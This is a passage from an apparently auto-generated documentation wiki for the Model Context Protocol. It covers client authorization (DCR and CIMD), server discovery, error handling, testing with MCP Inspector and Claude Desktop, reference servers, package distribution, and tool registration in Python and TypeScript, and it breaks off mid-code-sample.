    
    subgraph "Flow"
        STEP1["1. Client requests server"]
        STEP2["2. Server returns 401<br/>+ resource_metadata URL"]
        STEP3["3. Client discovers<br/>authorization server"]
        STEP4["4. Client registers<br/>via DCR or CIMD"]
        STEP5["5. User authorizes<br/>in browser"]
        STEP6["6. Client receives token"]
        STEP7["7. Client makes<br/>authenticated requests"]
    end
    
    CLIENT --> STEP1
    STEP1 --> MCP_SERVER
    MCP_SERVER --> STEP2
    STEP2 --> CLIENT
    CLIENT --> STEP3
    STEP3 --> AUTH_SERVER
    AUTH_SERVER --> STEP4
    STEP4 --> AUTH_SERVER
    AUTH_SERVER --> STEP5
    STEP5 --> BROWSER
    BROWSER --> STEP6
    STEP6 --> CLIENT
    CLIENT --> STEP7
    STEP7 --> MCP_SERVER
```

Sources: [docs/docs/tutorials/security/authorization.mdx:29-134]()

### Dynamic Client Registration (DCR)

DCR allows clients to automatically register themselves with the authorization server without pre-configuration.

**Process:**
1. Client discovers authorization server metadata
2. Client sends registration request to `registration_endpoint`
3. Authorization server returns client credentials
4. Client uses credentials for OAuth flow

**Client Support:**
Clients that support DCR can connect to any remote server without manual setup, as long as the authorization server supports DCR.

Sources: [docs/docs/tutorials/security/authorization.mdx:79-104]()

### Client ID Metadata Documents (CIMD)

CIMD (SEP-991) provides an alternative to DCR where client information is embedded in the client application itself.

**Process:**
1. Client includes pre-configured client metadata
2. Client uses metadata for OAuth flow
3. No registration request needed

**Advantages:**
- Simpler than DCR
- Works with authorization servers that don't support DCR
- Client metadata is static and known in advance

Sources: [docs/docs/tutorials/security/authorization.mdx:79-104]()

## Server Discovery and Listing

Clients discover available servers through configuration files or dynamic discovery mechanisms.

### Configuration-Based Discovery

Most clients read server definitions from configuration files at startup. This is the primary discovery mechanism for local servers.

**Discovery Process:**
1. Client reads configuration file
2. Client parses server entries
3. Client spawns or connects to servers
4. Client calls `initialize` on each server
5. Servers become available in the client UI

### Dynamic Discovery

Some clients support dynamic server discovery through:
- MCP Registry queries
- Authorization server metadata
- Server list endpoints

Sources: [docs/clients.mdx:282-303]()

## Error Handling and Fallback Patterns

Clients implement error handling for common failure scenarios.

### Server Startup Failures

When a local server fails to start:
1. Client logs the error
2. Client marks server as unavailable
3. Client may retry with exponential backoff
4. User is notified in the UI

### Connection Failures

When a remote server is unreachable:
1. Client attempts reconnection
2. Client may use cached capability information
3. Client disables server features if connection fails
4. User is notified of connection status

### Authorization Failures

When authorization fails:
1. Client may retry the OAuth flow
2. Client may prompt user to re-authorize
3. Client disables server access until authorized
4. User is notified of authorization status

Sources: [docs/clients.mdx:1-300]()

## Feature Support Matrix

Different clients support different MCP features. The feature matrix helps developers understand which clients can use their servers.

```mermaid
graph TB
    subgraph "Feature Categories"
        CORE["Core Features<br/>Tools, Resources, Prompts"]
        CLIENT_CAPS["Client Capabilities<br/>Sampling, Elicitation, Roots"]
        AUTH["Authorization<br/>DCR, CIMD"]
        ADVANCED["Advanced<br/>Tasks, Apps, Discovery"]
    end
    
    subgraph "Client Groups"
        DESKTOP_CLIENTS["Desktop Clients<br/>Claude, VS Code, Cursor"]
        WEB_CLIENTS["Web Clients<br/>ChatGPT, Claude.ai"]
        CLI_CLIENTS["CLI Tools<br/>Gemini CLI, Amazon Q"]
        FRAMEWORKS["Frameworks<br/>Continue, Genkit"]
    end
    
    CORE --> DESKTOP_CLIENTS
    CORE --> WEB_CLIENTS
    CORE --> CLI_CLIENTS
    CORE --> FRAMEWORKS
    
    CLIENT_CAPS --> DESKTOP_CLIENTS
    CLIENT_CAPS --> FRAMEWORKS
    
    AUTH --> WEB_CLIENTS
    AUTH --> DESKTOP_CLIENTS
    
    ADVANCED --> DESKTOP_CLIENTS
    ADVANCED --> FRAMEWORKS
```

Sources: [docs/clients.mdx:8-23]()

## Testing Client Integration

### Using MCP Inspector

The MCP Inspector is a debugging tool for testing server integration with clients.

**Features:**
- Connect to local or remote servers
- Test tool execution
- Inspect resource access
- Verify prompt templates
- Debug authorization flows

**Usage:**
```bash
mcp-inspector <server-command> [args...]
```

Sources: [docs/docs/tutorials/security/authorization.mdx:1-50]()

### Configuration Validation

Before deploying a server, validate the configuration:

1. **Syntax Check:** Ensure JSON is valid
2. **Command Verification:** Test that the server command runs
3. **Capability Check:** Verify server responds to `initialize`
4. **Feature Test:** Test each capability (tools, resources, prompts)

### Client-Specific Testing

Test integration with each target client:

1. Add server to client configuration
2. Restart client
3. Verify server appears in UI
4. Test each feature (tools, resources, prompts)
5. Check error handling and logging

Sources: [docs/clients.mdx:1-300]()

## Best Practices for Client Integration

### Configuration Management

- Use environment variables for sensitive data (API keys, tokens)
- Document all required environment variables
- Provide example configuration files
- Support multiple configuration locations

### Error Messages

- Provide clear error messages for startup failures
- Log detailed information for debugging
- Include suggestions for common issues
- Document troubleshooting steps

### Performance Considerations

- Minimize startup time for local servers
- Cache capability information when possible
- Implement connection pooling for remote servers
- Use appropriate timeouts for network operations

### Security

- Never embed secrets in configuration files
- Use OAuth 2.1 for remote server authorization
- Validate server certificates for HTTPS connections
- Implement rate limiting for tool execution

Sources: [docs/docs/tutorials/security/authorization.mdx:1-50]()

---

# Page: Server Development

# Server Development

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [docs/examples.mdx](docs/examples.mdx)
- [docs/specification/2025-06-18/server/prompts.mdx](docs/specification/2025-06-18/server/prompts.mdx)
- [docs/specification/2025-06-18/server/resources.mdx](docs/specification/2025-06-18/server/resources.mdx)
- [docs/specification/2025-06-18/server/tools.mdx](docs/specification/2025-06-18/server/tools.mdx)
- [docs/specification/draft/basic/index.mdx](docs/specification/draft/basic/index.mdx)
- [docs/specification/draft/basic/lifecycle.mdx](docs/specification/draft/basic/lifecycle.mdx)
- [docs/specification/draft/server/prompts.mdx](docs/specification/draft/server/prompts.mdx)
- [docs/specification/draft/server/resources.mdx](docs/specification/draft/server/resources.mdx)
- [docs/specification/draft/server/tools.mdx](docs/specification/draft/server/tools.mdx)

</details>



MCP servers are lightweight, domain-focused programs that expose specific capabilities—tools, resources, and prompts—to AI applications through a standardized protocol. This page introduces the server development ecosystem, the philosophy of composable servers, and guides you to detailed implementation resources.

The MCP server ecosystem has grown explosively, with approximately 2,000 servers in the [MCP Registry](https://mcp.run) as of November 2025—a 407% growth since September 2024. This includes official integrations from companies like Notion, Stripe, GitHub, Hugging Face, and Postman, alongside thousands of community-contributed servers.

For client-side development, see [Build an MCP Client](#4).

## Server Development Philosophy

MCP servers follow a **domain-focused, composable** design philosophy:

**Domain-Focused:** Each server specializes in a specific domain or service rather than attempting to provide general-purpose functionality. For example:
- A weather server focuses solely on weather data and forecasts
- A filesystem server provides file operations within specified boundaries
- A GitHub server handles repository interactions

**Composable:** Servers are designed to work together, allowing AI applications to combine multiple specialized servers to accomplish complex tasks. A travel planning application might connect to:
- A calendar server (availability)
- A flights server (booking)
- A weather server (destination forecasts)
- An email server (confirmations)

This approach reduces complexity, improves maintainability, and enables rapid ecosystem growth through specialization.

## The MCP Server Ecosystem

The server ecosystem consists of three tiers, each serving different purposes:

**Server Ecosystem Structure:**

```mermaid
graph TB
    subgraph "Reference Servers"
        REF_EVERYTHING["Everything Server<br/>modelcontextprotocol/servers<br/>/src/everything"]
        REF_FILESYSTEM["Filesystem Server<br/>modelcontextprotocol/servers<br/>/src/filesystem"]
        REF_GIT["Git Server<br/>modelcontextprotocol/servers<br/>/src/git"]
        REF_MEMORY["Memory Server<br/>modelcontextprotocol/servers<br/>/src/memory"]
    end
    
    subgraph "Official Integrations"
        OFF_NOTION["Notion MCP Server<br/>makenotion/notion-mcp-server"]
        OFF_STRIPE["Stripe MCP Server<br/>stripe.com/mcp"]
        OFF_GITHUB["GitHub MCP Server<br/>github/github-mcp-server"]
        OFF_HF["Hugging Face MCP<br/>huggingface/hf-mcp-server"]
    end
    
    subgraph "Community Servers"
        COMM_COUNT["~2000 Servers<br/>MCP Registry<br/>407% growth since Sept 2024"]
        COMM_EXAMPLES["Examples:<br/>Blender, Databases,<br/>APIs, Custom Tools"]
    end
    
    subgraph "SDK Layer"
        SDK_PYTHON["Python SDK<br/>FastMCP class<br/>mcp.server module"]
        SDK_TS["TypeScript SDK<br/>McpServer class<br/>@modelcontextprotocol/sdk"]
        SDK_JAVA["Java SDK<br/>Spring AI MCP<br/>@Tool annotations"]
        SDK_OTHER["Go, Kotlin, Swift<br/>C#, Ruby, Rust, PHP"]
    end
    
    REF_EVERYTHING --> SDK_PYTHON
    REF_FILESYSTEM --> SDK_TS
    REF_GIT --> SDK_TS
    REF_MEMORY --> SDK_TS
    
    OFF_NOTION --> SDK_TS
    OFF_STRIPE --> SDK_TS
    OFF_GITHUB --> SDK_TS
    OFF_HF --> SDK_PYTHON
    
    COMM_COUNT --> SDK_PYTHON
    COMM_COUNT --> SDK_TS
    COMM_COUNT --> SDK_JAVA
    COMM_COUNT --> SDK_OTHER
```

**Sources:** [blog/content/posts/2025-11-25-first-mcp-anniversary.md:18-28](), [docs/examples.mdx:8-34]()

### Reference Servers

Official examples demonstrating protocol features and best practices. These servers serve as learning resources and SDK usage examples:

| Server | Purpose | Location |
|--------|---------|----------|
| **Everything** | Test server with all features (tools, resources, prompts) | `modelcontextprotocol/servers/src/everything` |
| **Fetch** | Web content retrieval and markdown conversion | `modelcontextprotocol/servers/src/fetch` |
| **Filesystem** | Secure file operations with access controls | `modelcontextprotocol/servers/src/filesystem` |
| **Git** | Repository management and history | `modelcontextprotocol/servers/src/git` |
| **Memory** | Knowledge graph-based persistent storage | `modelcontextprotocol/servers/src/memory` |
| **Sequential Thinking** | Problem-solving through thought sequences | `modelcontextprotocol/servers/src/sequentialthinking` |
| **Time** | Timezone and time conversion utilities | `modelcontextprotocol/servers/src/time` |

See [Reference Server Implementations](#5.2) for detailed documentation.

**Sources:** [docs/examples.mdx:10-21]()

### Official Integrations

Company-maintained servers for their platforms and services:

- **Notion** - Note and workspace management (`makenotion/notion-mcp-server`)
- **Stripe** - Payment workflow automation (`docs.stripe.com/mcp`)
- **GitHub** - Repository operations and engineering automation (`github/github-mcp-server`)
- **Hugging Face** - Model management and dataset search (`huggingface/hf-mcp-server`)
- **Postman** - API testing workflows (`postmanlabs/postman-mcp-server`)

**Sources:** [blog/content/posts/2025-11-25-first-mcp-anniversary.md:20-26]()

### Community Servers

The community has built approximately 2,000 servers indexed in the [MCP Registry](https://mcp.run), covering diverse use cases:

- Database integrations (PostgreSQL, SQLite, MySQL, MongoDB)
- Cloud platforms (AWS, Azure, Google Cloud)
- Development tools (Docker, Kubernetes, CI/CD)
- Communication (Slack, Discord, Teams)
- Productivity (Google Drive, Dropbox, calendars)
- Specialized tools (Blender 3D, data analysis, monitoring)

Registry growth: **407% increase** since September 2024.

See [Server Registry and Community Servers](#5.4) for discovery and contribution guidelines.

**Sources:** [blog/content/posts/2025-11-25-first-mcp-anniversary.md:28]()

## Server Capabilities Overview

MCP servers expose three types of capabilities:

| Capability | Control | Description | Example Use Case |
|------------|---------|-------------|------------------|
| **Tools** | Model | Executable functions the AI can invoke | `search_flights`, `create_calendar_event` |
| **Resources** | Application | Read-only data sources for context | `file:///docs/api.md`, `calendar://events/2024` |
| **Prompts** | User | Reusable interaction templates | `plan_vacation`, `summarize_meeting` |

**Capability Decision Flow:**

```mermaid
graph TD
    START["Need to Expose Functionality"]
    
    Q1{"Does it<br/>perform actions<br/>or read data?"}
    Q2{"Should AI model<br/>decide when to use it?"}
    Q3{"Is it<br/>parameterized<br/>template?"}
    
    TOOL["Implement as TOOL<br/>@mcp.tool decorator (Python)<br/>server.tool() (TypeScript)"]
    RESOURCE["Implement as RESOURCE<br/>resources/list endpoint<br/>resources/read handler"]
    PROMPT["Implement as PROMPT<br/>prompts/list endpoint<br/>prompts/get handler"]
    
    START --> Q1
    Q1 -->|"Performs actions"| Q2
    Q1 -->|"Reads data"| RESOURCE
    Q2 -->|"Yes"| TOOL
    Q2 -->|"No, user controls"| Q3
    Q3 -->|"Yes"| PROMPT
    Q3 -->|"No"| RESOURCE
```

For detailed capability implementation, see [Server Capabilities Deep Dive](#5.3).

**Sources:** [docs/docs/learn/server-concepts.mdx:10-19]()

## Building Your First Server

### SDK Selection

MCP provides official SDKs in multiple languages, all offering full protocol support:

```mermaid
graph TB
    subgraph "Primary SDKs"
        PY["Python SDK<br/>FastMCP class<br/>github.com/modelcontextprotocol/<br/>python-sdk"]
        TS["TypeScript SDK<br/>McpServer class<br/>github.com/modelcontextprotocol/<br/>typescript-sdk"]
        JAVA["Java SDK<br/>Spring AI Integration<br/>github.com/modelcontextprotocol/<br/>java-sdk"]
    end
    
    subgraph "Additional Languages"
        GO["Go SDK"]
        KOTLIN["Kotlin SDK"]
        SWIFT["Swift SDK"]
        CSHARP["C# SDK"]
        RUBY["Ruby SDK"]
        RUST["Rust SDK"]
        PHP["PHP SDK"]
    end
    
    subgraph "Key Features"
        TOOLS_SUPPORT["Tool Registration<br/>Input Validation<br/>Execution Handlers"]
        RESOURCE_SUPPORT["Resource Exposure<br/>Template Support<br/>Read Handlers"]
        PROMPT_SUPPORT["Prompt Definition<br/>Argument Schemas<br/>Completion Support"]
        TRANSPORT["STDIO & HTTP<br/>Transport Support"]
    end
    
    PY --> TOOLS_SUPPORT
    TS --> TOOLS_SUPPORT
    JAVA --> TOOLS_SUPPORT
    
    PY --> RESOURCE_SUPPORT
    TS --> RESOURCE_SUPPORT
    
    PY --> PROMPT_SUPPORT
    TS --> PROMPT_SUPPORT
    
    PY --> TRANSPORT
    TS --> TRANSPORT
    JAVA --> TRANSPORT
```

Choose based on your preferred language and deployment environment. See [Building MCP Servers](#5.1) for language-specific quickstarts.

**Sources:** [docs/docs/sdk.mdx:9-72]()

### Development Workflow

**Typical server development process:**

```mermaid
graph TD
    SETUP["1. Project Setup<br/>Install SDK<br/>Initialize project"]
    
    DEFINE["2. Define Capabilities<br/>Choose tools/resources/prompts<br/>Design input schemas"]
    
    IMPLEMENT["3. Implement Handlers<br/>Tool execution logic<br/>Resource read logic<br/>Error handling"]
    
    TRANSPORT["4. Configure Transport<br/>STDIO for local<br/>HTTP for remote"]
    
    TEST_INSPECTOR["5. Test with Inspector<br/>github.com/modelcontextprotocol/<br/>inspector"]
    
    TEST_CLIENT["6. Test with Client<br/>Claude Desktop or<br/>custom client"]
    
    DEPLOY["7. Deploy<br/>Package distribution<br/>Client configuration"]
    
    SETUP --> DEFINE
    DEFINE --> IMPLEMENT
    IMPLEMENT --> TRANSPORT
    TRANSPORT --> TEST_INSPECTOR
    TEST_INSPECTOR --> TEST_CLIENT
    TEST_CLIENT --> DEPLOY
```

**Example: Weather Server Structure (Python)**

```mermaid
graph TB
    subgraph "weather.py Server Implementation"
        IMPORT["from mcp.server.fastmcp import FastMCP"]
        INSTANCE["mcp = FastMCP('weather')"]
        
        TOOL1["@mcp.tool()<br/>async def get_alerts(state: str)"]
        TOOL2["@mcp.tool()<br/>async def get_forecast(latitude, longitude)"]
        
        HELPER["Helper functions:<br/>make_nws_request()<br/>format_alert()"]
        
        RUN["mcp.run(transport='stdio')"]
    end
    
    subgraph "Client Configuration"
        CONFIG["claude_desktop_config.json<br/>'command': 'uv'<br/>'args': ['run', 'weather.py']"]
    end
    
    IMPORT --> INSTANCE
    INSTANCE --> TOOL1
    INSTANCE --> TOOL2
    TOOL1 --> HELPER
    TOOL2 --> HELPER
    HELPER --> RUN
    
    RUN -.->|"Launched by"| CONFIG
```

See [Building MCP Servers](#5.1) for complete quickstart tutorials including:
- Python FastMCP quickstart
- TypeScript SDK quickstart  
- Java Spring AI quickstart

**Sources:** [docs/docs/develop/build-server.mdx:1-262]()

## Server Execution and Deployment

### Local Deployment (STDIO Transport)

Most MCP servers use STDIO transport for local execution. The MCP host (e.g., Claude Desktop) launches the server as a subprocess and communicates via stdin/stdout.

**Server Launch Configuration:**

```mermaid
graph TB
    subgraph "Claude Desktop Process"
        HOST["Claude Desktop<br/>MCP Host"]
        CONFIG["claude_desktop_config.json<br/>~/Library/Application Support/<br/>Claude/ (macOS)"]
        CLIENT["MCP Client Instance"]
    end
    
    subgraph "Server Process"
        PYTHON_SERVER["Python Server<br/>Command: 'uv'<br/>Args: ['run', 'weather.py']"]
        TS_SERVER["TypeScript Server<br/>Command: 'node'<br/>Args: ['build/index.js']"]
        JAVA_SERVER["Java Server<br/>Command: 'java'<br/>Args: ['-jar', 'server.jar']"]
    end
    
    subgraph "Communication"
        STDIN["stdin<br/>JSON-RPC requests"]
        STDOUT["stdout<br/>JSON-RPC responses"]
        STDERR["stderr<br/>Logging only"]
    end
    
    HOST --> CONFIG
    CONFIG -->|"Reads server config"| CLIENT
    CLIENT -->|"Spawns subprocess"| PYTHON_SERVER
    CLIENT -->|"Spawns subprocess"| TS_SERVER
    CLIENT -->|"Spawns subprocess"| JAVA_SERVER
    
    CLIENT --> STDIN
    STDOUT --> CLIENT
    STDERR -.->|"Debug logs"| HOST
```

**Configuration Example (`claude_desktop_config.json`):**

```json
{
  "mcpServers": {
    "weather": {
      "command": "uv",
      "args": ["--directory", "/absolute/path/to/weather", "run", "weather.py"]
    },
    "filesystem": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/Users/username/Documents"]
    }
  }
}
```

**Critical Requirement:** STDIO servers must **never write to stdout** except for JSON-RPC messages. All logging must use stderr.

**Sources:** [docs/docs/develop/build-server.mdx:44-95](), [docs/docs/develop/build-server.mdx:277-353]()

### Remote Deployment (HTTP Transport)

Remote servers use HTTP POST for requests and Server-Sent Events (SSE) for streaming. They require OAuth 2.1 authorization for security.

See [Connect to Remote MCP Servers](#5) for HTTP server configuration and authorization setup.

**Sources:** [docs/docs/develop/connect-remote-servers.mdx:1-10]()

### Package Distribution

**NPM (TypeScript):**

```bash
npm publish @modelcontextprotocol/server-name
# Users install via:
npx -y @modelcontextprotocol/server-name
```

**PyPI (Python):**

```bash
# Publish
python -m build
twine upload dist/*

# Users install via:
uvx mcp-server-name
# or
pip install mcp-server-name
python -m mcp_server_name
```

**Sources:** [docs/examples.mdx:38-55]()

## Testing and Debugging

### MCP Inspector

Interactive testing tool for server development:

**Location:** `github.com/modelcontextprotocol/inspector`

**Features:**
- Browse available tools, resources, and prompts
- Execute tools with custom inputs
- View real-time notifications
- Monitor request/response logs

**Usage:**

```bash
npx @modelcontextprotocol/inspector path/to/server
```

**Sources:** [docs/docs/learn/architecture.mdx:19]()

### Testing with Claude Desktop

1. Add server to `claude_desktop_config.json`
2. Restart Claude Desktop completely
3. Verify hammer icon appears in chat input
4. Click to see available tools
5. Test tool execution with approval dialogs

**Debugging Logs:**

- **macOS:** `~/Library/Logs/Claude/mcp*.log`
- **Windows:** `%APPDATA%\Claude\logs\mcp*.log`

View recent logs:

```bash
# macOS/Linux
tail -n 20 -f ~/Library/Logs/Claude/mcp*.log

# Windows
type "%APPDATA%\Claude\logs\mcp*.log"
```

**Sources:** [docs/docs/develop/connect-local-servers.mdx:202-249]()

## Reference Server Implementations

The MCP repository includes reference servers that demonstrate protocol features and SDK usage.

### Active Reference Servers

```mermaid
graph TB
    subgraph "Reference Servers"
        EVERYTHING["Everything Server<br/>Test bed with all features"]
        FETCH["Fetch Server<br/>Web content retrieval"]
        FILESYSTEM["Filesystem Server<br/>File operations"]
        GIT["Git Server<br/>Repository management"]
        MEMORY["Memory Server<br/>Knowledge graph storage"]
        SEQUENTIAL["Sequential Thinking Server<br/>Problem-solving workflows"]
        TIME["Time Server<br/>Timezone conversions"]
    end
    
    subgraph "Server Capabilities"
        TOOLS["Tools<br/>Executable functions"]
        RESOURCES["Resources<br/>Data access"]
        PROMPTS["Prompts<br/>Templates"]
    end
    
    EVERYTHING --> TOOLS
    EVERYTHING --> RESOURCES
    EVERYTHING --> PROMPTS
    
    FETCH --> TOOLS
    FILESYSTEM --> TOOLS
    GIT --> TOOLS
    MEMORY --> TOOLS
    SEQUENTIAL --> TOOLS
    TIME --> TOOLS
```

**Sources:** [docs/examples.mdx:8-21]()

### Everything Server

Comprehensive test server implementing all MCP features. Used for protocol validation and SDK testing.

**Location:** `https://github.com/modelcontextprotocol/servers/tree/main/src/everything`

**Features:**
- Example tools with various input schemas
- Resource implementations (direct and templates)
- Prompt templates with parameters
- Notification support

**Sources:** [docs/examples.mdx:14]()

### Filesystem Server

Provides secure file operations with configurable access controls. Demonstrates resource boundaries and tool permission patterns.

**Location:** `https://github.com/modelcontextprotocol/servers/tree/main/src/filesystem`

**Capabilities:**
- File reading and writing
- Directory navigation
- File search by name and content
- Move and rename operations

**Usage:**

```bash
npx -y @modelcontextprotocol/server-filesystem /path/to/allowed/directory
```

**Configuration in Claude Desktop:**

[docs/docs/develop/connect-local-servers.mdx:92-127]()

**Sources:** [docs/examples.mdx:16](), [docs/docs/develop/connect-local-servers.mdx:89-147]()

### Git Server

Provides tools for reading, searching, and manipulating Git repositories.

**Location:** `https://github.com/modelcontextprotocol/servers/tree/main/src/git`

**Capabilities:**
- Repository status and history
- Branch operations
- Commit information
- File diff generation

**Sources:** [docs/examples.mdx:17]()

### Memory Server

Knowledge graph-based persistent memory system for AI interactions.

**Location:** `https://github.com/modelcontextprotocol/servers/tree/main/src/memory`

**Capabilities:**
- Entity storage and retrieval
- Relationship management
- Graph traversal
- Semantic search

**Usage:**

```bash
npx -y @modelcontextprotocol/server-memory
```

**Sources:** [docs/examples.mdx:18]()

### Fetch Server

Web content fetching and conversion optimized for LLM consumption.

**Location:** `https://github.com/modelcontextprotocol/servers/tree/main/src/fetch`

**Capabilities:**
- HTML to markdown conversion
- Content extraction
- Metadata parsing
- URL validation

**Sources:** [docs/examples.mdx:15]()

### Archived Servers

Historical reference servers moved to `https://github.com/modelcontextprotocol/servers-archived`. These are no longer actively maintained but provide implementation examples:

- **PostgreSQL Server** - Read-only database access with schema inspection
- **SQLite Server** - Database interaction and business intelligence
- **GitHub Server** - Repository management and GitHub API integration
- **Slack Server** - Channel management and messaging
- **Google Drive Server** - File access and search

[docs/examples.mdx:22-53]()

**Sources:** [docs/examples.mdx:22-53]()

## Server Execution Patterns

### Running Reference Servers

**TypeScript servers via npx:**

```bash
npx -y @modelcontextprotocol/server-memory
```

The `-y` flag automatically confirms package installation.

**Python servers via uvx:**

```bash
uvx mcp-server-git
```

Alternative using pip:

```bash
pip install mcp-server-git
python -m mcp_server_git
```

[docs/examples.mdx:62-81]()

**Sources:** [docs/examples.mdx:62-81]()

### Server Entry Points

**Python server structure:**

[docs/docs/develop/build-server.mdx:255-262]()

- `FastMCP` instance initialization
- Tool/resource/prompt registration
- `mcp.run(transport='stdio')` to start server

**TypeScript server structure:**

[docs/docs/develop/build-server.mdx:732-746]()

- `McpServer` instance with capabilities
- Tool registration via `server.tool()`
- `StdioServerTransport` connection
- Async `server.connect()` to start

**Sources:** [docs/docs/develop/build-server.mdx:253-262](), [docs/docs/develop/build-server.mdx:732-746]()

## Testing and Deployment

### Testing with MCP Inspector

The MCP Inspector is an interactive developer tool for testing MCP servers:

**Features:**
- Resource inspection
- Prompt testing
- Tool execution
- Log and notification viewing

**Location:** `https://github.com/modelcontextprotocol/inspector`

**Sources:** [docs/docs/learn/architecture.mdx:19]()

### Testing with Claude Desktop

Claude Desktop provides a complete integration environment for testing local MCP servers:

1. Configure server in `claude_desktop_config.json`
2. Restart Claude Desktop
3. Verify server indicator appears (hammer icon in input box)
4. Test tool execution with approval dialogs

[docs/docs/develop/build-server.mdx:268-353]()

**Troubleshooting:**

- Check logs at `~/Library/Logs/Claude/mcp*.log` (macOS) or `%APPDATA%\Claude\logs` (Windows)
- Verify absolute paths in configuration
- Test server execution manually from command line

[docs/docs/develop/connect-local-servers.mdx:202-249]()

**Sources:** [docs/docs/develop/build-server.mdx:268-353](), [docs/docs/develop/connect-local-servers.mdx:202-265]()

### Building Custom Servers

For custom server development, start with the quickstart tutorials:

- Python: [docs/docs/develop/build-server.mdx:33-353]()
- TypeScript: [docs/docs/develop/build-server.mdx:356-815]()
- Java: [docs/docs/develop/build-server.mdx:817-1134]()

**Development workflow:**

1. Install SDK for chosen language
2. Define tools with input schemas
3. Implement tool execution handlers
4. Configure transport (STDIO or HTTP)
5. Test with MCP Inspector or Claude Desktop
6. Deploy via client configuration

**Best practices:**

- Use descriptive tool names following format: `category_action` (e.g., `weather_get_forecast`)
- Provide detailed descriptions for AI model understanding
- Implement proper error handling
- Log to stderr only (for STDIO servers)
- Validate inputs using JSON Schema
- Request user approval for destructive operations

[docs/docs/develop/build-server.mdx:57-63]()

**Sources:** [docs/docs/develop/build-server.mdx:1-1134]()

### SDK-Specific Considerations

**Python (FastMCP):**
- Automatic schema generation from type hints
- Decorator-based tool registration
- Async/await required for handlers
- `uv` for dependency management

**TypeScript:**
- Explicit Zod schema definitions
- Type-safe tool handlers
- Compile step required (`npm run build`)
- Node.js 16+ required

**Java (Spring AI MCP):**
- Auto-configuration via Spring Boot
- Annotation-based tool definitions
- STDIO and SSE transport options
- Integration with Spring AI ChatClient

**Sources:** [docs/docs/develop/build-server.mdx:77-1134](), [docs/docs/sdk.mdx:1-90]()

## Server Distribution

### NPM Package Distribution (TypeScript)

TypeScript servers can be published as npm packages for easy distribution:

```json
{
  "name": "@modelcontextprotocol/server-name",
  "bin": {
    "server-name": "./build/index.js"
  },
  "files": ["build"]
}
```

Users install and run via npx:

```bash
npx -y @modelcontextprotocol/server-name
```

**Sources:** [docs/examples.mdx:66-70]()

### PyPI Package Distribution (Python)

Python servers can be published to PyPI for distribution:

```bash
pip install mcp-server-name
python -m mcp_server_name
```

Or using uvx for isolated execution:

```bash
uvx mcp-server-name
```

**Sources:** [docs/examples.mdx:73-81]()

### Environment Variables

Servers requiring API keys or credentials use environment variables passed through client configuration:

```json
{
  "mcpServers": {
    "server-name": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-name"],
      "env": {
        "API_KEY": "secret-value",
        "BASE_URL": "https://api.example.com"
      }
    }
  }
}
```

[docs/examples.mdx:86-111]()

**Sources:** [docs/examples.mdx:86-111]()

---

# Page: Building MCP Servers

# Building MCP Servers

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [docs/community/sdk-tiers.mdx](docs/community/sdk-tiers.mdx)
- [docs/docs/develop/connect-local-servers.mdx](docs/docs/develop/connect-local-servers.mdx)
- [docs/docs/getting-started/intro.mdx](docs/docs/getting-started/intro.mdx)
- [docs/docs/sdk.mdx](docs/docs/sdk.mdx)
- [docs/docs/tools/inspector.mdx](docs/docs/tools/inspector.mdx)
- [docs/examples.mdx](docs/examples.mdx)
- [docs/legacy/concepts/architecture.mdx](docs/legacy/concepts/architecture.mdx)
- [docs/legacy/concepts/sampling.mdx](docs/legacy/concepts/sampling.mdx)
- [docs/legacy/tools/debugging.mdx](docs/legacy/tools/debugging.mdx)

</details>



This guide covers the practical implementation patterns for building MCP servers. It demonstrates how to register tools, expose resources, define prompts, and handle client feature requests like sampling and elicitation.

For a complete tutorial building a weather server from scratch, see [Quick Start Guide](#5.1). For conceptual understanding of server capabilities, see [Understanding MCP Servers](#5.3). For SDK-specific APIs, see [SDK Reference](#6).

## Server Implementation Overview

Building an MCP server involves implementing handlers for three core server capabilities and optionally supporting client features. The implementation pattern varies by SDK but follows the same conceptual flow.

### Implementation Flow Diagram

```mermaid
graph TB
    START["Initialize Server Instance"]
    REGISTER["Register Capabilities"]
    TRANSPORT["Configure Transport"]
    RUN["Start Server"]
    HANDLE["Handle Client Requests"]
    
    START --> REGISTER
    REGISTER --> TOOLS["Register Tools<br/>@tool decorator or server.tool()"]
    REGISTER --> RESOURCES["Register Resources<br/>server.resource() or handlers"]
    REGISTER --> PROMPTS["Register Prompts<br/>server.prompt() or handlers"]
    TOOLS --> TRANSPORT
    RESOURCES --> TRANSPORT
    PROMPTS --> TRANSPORT
    TRANSPORT --> STDIO["stdio transport<br/>StdioServerTransport"]
    TRANSPORT --> HTTP["HTTP transport<br/>Streamable HTTP"]
    STDIO --> RUN
    HTTP --> RUN
    RUN --> HANDLE
    HANDLE --> TOOLCALL["tools/call"]
    HANDLE --> RESREAD["resources/read"]
    HANDLE --> PROMPTGET["prompts/get"]
```

**Code Entity Mapping:**

| Concept | TypeScript SDK | Python SDK | Java SDK |
|---------|---------------|------------|----------|
| Server Instance | `McpServer` or `Server` | `FastMCP` or `Server` | `McpServer` |
| Tool Registration | `server.tool()` | `@mcp.tool()` or `server.add_tool()` | `McpServer.addTool()` |
| Resource Registration | `server.resource()` | `server.add_resource()` | `McpServer.addResource()` |
| Prompt Registration | `server.prompt()` | `server.add_prompt()` | `McpServer.addPrompt()` |
| stdio Transport | `StdioServerTransport` | `stdio_server()` | `StdioServerTransport` |

Sources: [docs/docs/develop/build-server.mdx:138-262](), [docs/docs/develop/build-server.mdx:490-746]()

## Registering Tools

Tools are the primary mechanism for MCP servers to expose executable functionality to clients. Tool registration involves defining the tool's input schema and implementing its execution logic.

### Python Tool Registration Pattern

The Python SDK provides the `@mcp.tool()` decorator for automatic tool registration using FastMCP:

```python
# Using FastMCP decorator pattern
from mcp.server.fastmcp import FastMCP

mcp = FastMCP("server-name")

@mcp.tool()
async def get_forecast(latitude: float, longitude: float) -> str:
    """Get weather forecast for a location.
    
    Args:
        latitude: Latitude of the location
        longitude: Longitude of the location
    """
    # Tool implementation
    return forecast_data
```

The decorator automatically:
- Extracts the input schema from type hints
- Uses the docstring for tool description
- Registers the tool with the server
- Handles argument validation

Sources: [docs/docs/develop/build-server.mdx:194-249]()

### TypeScript Tool Registration Pattern

The TypeScript SDK uses explicit schema definition with Zod:

```typescript
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";

const server = new McpServer({
  name: "weather",
  version: "1.0.0",
  capabilities: { tools: {} }
